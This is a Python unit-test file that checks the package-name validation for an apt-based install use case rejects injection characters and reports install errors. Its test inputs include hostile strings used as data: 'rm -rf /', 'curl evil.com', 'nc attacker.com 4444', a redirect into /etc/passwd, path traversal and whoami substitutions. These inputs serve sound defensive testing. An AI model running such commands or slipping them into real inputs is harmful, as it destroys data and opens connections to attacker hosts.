"""Security validation and error enhancement tests for Package Use Cases - Coverage improvement."""

from unittest.mock import Mock

import pytest

from retromcp.application.package_use_cases import InstallPackagesUseCase
from retromcp.domain.models import CommandResult, ExecutionError, Result, ValidationError


@pytest.mark.unit
@pytest.mark.application
@pytest.mark.security
class TestPackageUseCasesSecurityValidation:
    """Test security validation and error enhancement for Package Use Cases to improve coverage."""

    @pytest.fixture
    def mock_system_repo(self):
        """Create mock system repository."""
        mock = Mock()
        mock.get_packages.return_value = Result.success([])
        mock.install_packages.return_value = Result.success(
            CommandResult(
                command="apt-get install test",
                exit_code=0,
                stdout="Success",
                stderr="",
                success=True,
                execution_time=1.0
            )
        )
        return mock

    @pytest.fixture
    def use_case(self, mock_system_repo):
        """Create InstallPackagesUseCase instance."""
        return InstallPackagesUseCase(mock_system_repo)

    def test_validate_package_name_with_semicolon_injection(self, use_case):
        """Test package name validation prevents command injection with semicolon."""
        malicious_packages = ["legitimate-package; rm -rf /"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character ';'" in result.error_value.message

    def test_validate_package_name_with_ampersand_injection(self, use_case):
        """Test package name validation prevents command injection with ampersand."""
        malicious_packages = ["package && curl evil.com"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '&'" in result.error_value.message

    def test_validate_package_name_with_pipe_injection(self, use_case):
        """Test package name validation prevents command injection with pipe."""
        malicious_packages = ["package | nc attacker.com 4444"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '|'" in result.error_value.message

    def test_validate_package_name_with_dollar_injection(self, use_case):
        """Test package name validation prevents variable injection with dollar."""
        malicious_packages = ["package$EVIL"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '$'" in result.error_value.message

    def test_validate_package_name_with_backtick_injection(self, use_case):
        """Test package name validation prevents command substitution with backticks."""
        malicious_packages = ["package`whoami`"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '`'" in result.error_value.message

    def test_validate_package_name_with_parentheses_injection(self, use_case):
        """Test package name validation prevents subshell injection with parentheses."""
        malicious_packages = ["package$(whoami)"]

        result = use_case.execute(malicious_packages)

        # Should return validation error
        # Note: $ is checked before ( in the validation loop, so $ is reported first
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '$'" in result.error_value.message

    def test_validate_package_name_with_braces_injection(self, use_case):
        """Test package name validation prevents injection with braces."""
        malicious_packages = ["package{evil}"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '{'" in result.error_value.message

    def test_validate_package_name_with_brackets_injection(self, use_case):
        """Test package name validation prevents injection with brackets."""
        malicious_packages = ["package[evil]"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '['" in result.error_value.message

    def test_validate_package_name_with_redirection_injection(self, use_case):
        """Test package name validation prevents file redirection injection."""
        malicious_packages = ["package > /etc/passwd"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '>'" in result.error_value.message

    def test_validate_package_name_with_backslash_injection(self, use_case):
        """Test package name validation prevents escape injection with backslash."""
        malicious_packages = ["package\\evil"]

        result = use_case.execute(malicious_packages)

        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '\\'" in result.error_value.message

    def test_validate_package_name_with_slash_injection(self, use_case):
        """Test package name validation prevents path traversal with slash."""
        malicious_packages = ["../../../etc/passwd"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "dangerous character '/'" in result.error_value.message

    def test_validate_package_name_empty_string(self, use_case):
        """Test package name validation rejects empty strings."""
        malicious_packages = [""]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "must be between 1 and 100 characters" in result.error_value.message

    def test_validate_package_name_too_long(self, use_case):
        """Test package name validation rejects overly long names."""
        malicious_packages = ["a" * 101]  # 101 characters
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "must be between 1 and 100 characters" in result.error_value.message

    def test_validate_package_name_non_alphanumeric(self, use_case):
        """Test package name validation rejects non-alphanumeric characters."""
        malicious_packages = ["package@evil.com"]
        
        result = use_case.execute(malicious_packages)
        
        # Should return validation error
        assert result.is_error()
        assert isinstance(result.error_value, ValidationError)
        assert "Invalid package name" in result.error_value.message

    def test_valid_package_names_with_hyphens_and_underscores(self, use_case):
        """Test that valid package names with hyphens and underscores are accepted."""
        valid_packages = ["python3-pip", "lib_ssl-dev", "python3", "gcc-9"]
        
        result = use_case.execute(valid_packages)
        
        # Should succeed for valid names
        assert result.is_success()

    def test_execute_enhances_error_details_for_single_failed_package(self, use_case, mock_system_repo):
        """Test that error details are enhanced when a single package fails."""
        mock_system_repo.install_packages.return_value = Result.error(
            ExecutionError(
                code="PACKAGE_INSTALL_FAILED",
                message="Installation failed",
                command="apt-get install fake-package",
                exit_code=100,
                stderr="E: Unable to locate package fake-package"
            )
        )
        
        result = use_case.execute(["fake-package"])
        
        # Should enhance error with failed package details
        assert result.is_error()
        error = result.error_value
        assert hasattr(error, 'details')
        assert error.details is not None
        assert "failed_packages" in error.details
        assert "fake-package" in error.details["failed_packages"]

    def test_execute_enhances_error_details_for_multiple_failed_packages(self, use_case, mock_system_repo):
        """Test that error details are enhanced when multiple packages fail."""
        mock_system_repo.install_packages.return_value = Result.error(
            ExecutionError(
                code="PACKAGE_INSTALL_FAILED",
                message="Installation failed",
                command="apt-get install fake1 fake2",
                exit_code=100,
                stderr="E: Unable to locate package fake1\nE: Unable to locate package fake2"
            )
        )
        
        result = use_case.execute(["fake1", "fake2"])
        
        # Should enhance error with all failed package details
        assert result.is_error()
        error = result.error_value
        assert hasattr(error, 'details')
        assert error.details is not None
        assert "failed_packages" in error.details
        assert "fake1" in error.details["failed_packages"]
        assert "fake2" in error.details["failed_packages"]

    def test_execute_handles_partial_success_scenarios(self, use_case, mock_system_repo):
        """Test that partial success scenarios are properly handled."""
        mock_system_repo.install_packages.return_value = Result.error(
            ExecutionError(
                code="PARTIAL_INSTALL_FAILURE",
                message="Some packages failed",
                command="apt-get install python3 fake-package vim",
                exit_code=100,
                stderr="E: Unable to locate package fake-package"
            )
        )
        
        result = use_case.execute(["python3", "fake-package", "vim"])
        
        # Should enhance error with partial success details
        assert result.is_error()
        error = result.error_value
        assert hasattr(error, 'details')
        assert error.details is not None
        assert "failed_packages" in error.details
        assert "succeeded" in error.details
        assert "failed" in error.details
        assert "total" in error.details
        assert "fake-package" in error.details["failed"]
        assert "python3" in error.details["succeeded"]
        assert "vim" in error.details["succeeded"]
        assert error.details["total"] == 3

    def test_execute_handles_stderr_without_package_names(self, use_case, mock_system_repo):
        """Test error handling when stderr doesn't contain specific package names."""
        mock_system_repo.install_packages.return_value = Result.error(
            ExecutionError(
                code="PACKAGE_INSTALL_FAILED",
                message="Installation failed",
                command="apt-get install test-package",
                exit_code=100,
                stderr="Network error: Could not connect to repository"
            )
        )
        
        result = use_case.execute(["test-package"])
        
        # Should still return error, but without enhanced details
        assert result.is_error()
        error = result.error_value
        # Details may or may not be enhanced depending on stderr content
        assert error.message == "Installation failed"

    def test_execute_handles_error_without_stderr(self, use_case, mock_system_repo):
        """Test error handling when ExecutionError has empty stderr."""
        mock_system_repo.install_packages.return_value = Result.error(
            ExecutionError(
                code="PACKAGE_INSTALL_FAILED",
                message="Installation failed",
                command="apt-get install test-package",
                exit_code=100,
                stderr=""  # Empty stderr instead of missing
            )
        )
        
        result = use_case.execute(["test-package"])
        
        # Should handle gracefully without crashing
        assert result.is_error()
        error = result.error_value
        assert error.message == "Installation failed"

    def test_execute_creates_details_dict_when_missing(self, use_case, mock_system_repo):
        """Test that details dict is created when the error doesn't have one."""
        error_without_details = ExecutionError(
            code="PACKAGE_INSTALL_FAILED",
            message="Installation failed",
            command="apt-get install fake-package",
            exit_code=100,
            stderr="E: Unable to locate package fake-package",
            details=None  # Explicitly set details to None
        )

        mock_system_repo.install_packages.return_value = Result.error(error_without_details)
        
        result = use_case.execute(["fake-package"])
        
        # Should create details dict and enhance error
        assert result.is_error()
        error = result.error_value
        assert hasattr(error, 'details')
        assert error.details is not None
        assert isinstance(error.details, dict)
        assert "failed_packages" in error.details